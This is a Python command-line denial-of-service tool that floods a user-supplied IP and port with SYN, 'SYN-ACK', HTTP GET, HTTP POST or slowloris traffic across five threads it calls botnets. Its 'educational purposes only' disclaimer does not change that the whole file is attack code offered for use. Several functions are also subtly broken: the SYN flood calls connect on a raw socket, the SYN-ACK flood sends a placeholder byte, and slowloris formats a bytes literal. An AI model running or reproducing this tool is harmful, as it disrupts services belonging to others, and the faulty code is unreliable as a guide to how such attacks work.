import socket
import threading
import random
import time
import sys

# Note: This code is for educational purposes only to understand network security concepts.
# Unauthorized use against systems without permission is illegal and unethical.

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def random_port():
    return random.randint(1024, 65535)

def syn_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            # IP and TCP header crafting would be here (requires raw socket privileges)
            # For simplicity, just connect and close quickly to simulate SYN flood
            s.connect((target_ip, target_port))
            s.close()
        except:
            pass

def syn_ack_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            s.send(b'\x12')  # Sending ACK flag byte (not a real TCP flag, just placeholder)
            s.close()
        except:
            pass

def http_get_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    user_agents = [
        "Mozilla/5.0", "Chrome/91.0", "Safari/537.36", "Opera/9.80", "Edge/18.18363"
    ]
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            get_req = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: close\r\n\r\n"
            s.send(get_req.encode())
            s.close()
        except:
            pass

def http_post_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    user_agents = [
        "Mozilla/5.0", "Chrome/91.0", "Safari/537.36", "Opera/9.80", "Edge/18.18363"
    ]
    post_data = "param1=value1&param2=value2"
    while time.time() < timeout:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            post_req = (
                f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(post_data)}\r\nConnection: close\r\n\r\n"
                f"{post_data}"
            )
            s.send(post_req.encode())
            s.close()
        except:
            pass

def slowloris(target_ip, target_port, duration):
    timeout = time.time() + duration
    sockets = []
    try:
        for _ in range(200):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(b"GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: en-US,en,q=0.5\r\n")
            sockets.append(s)
    except:
        pass

    while time.time() < timeout:
        for s in list(sockets):
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
        time.sleep(15)

    for s in sockets:
        try:
            s.close()
        except:
            pass

def botnet_worker(target_ip, target_port, duration, attack_func):
    attack_func(target_ip, target_port, duration)

def main():
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <target_ip> <target_port> <duration_seconds> <attack_type>")
        print("attack_type: syn, synack, get, post, slowloris")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    attack_type = sys.argv[4].lower()

    attack_map = {
        "syn": syn_flood,
        "synack": syn_ack_flood,
        "get": http_get_flood,
        "post": http_post_flood,
        "slowloris": slowloris
    }

    if attack_type not in attack_map:
        print("Invalid attack type.")
        sys.exit(1)

    attack_func = attack_map[attack_type]

    botnets = 5
    threads = []

    for _ in range(botnets):
        t = threading.Thread(target=botnet_worker, args=(target_ip, target_port, duration, attack_func))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
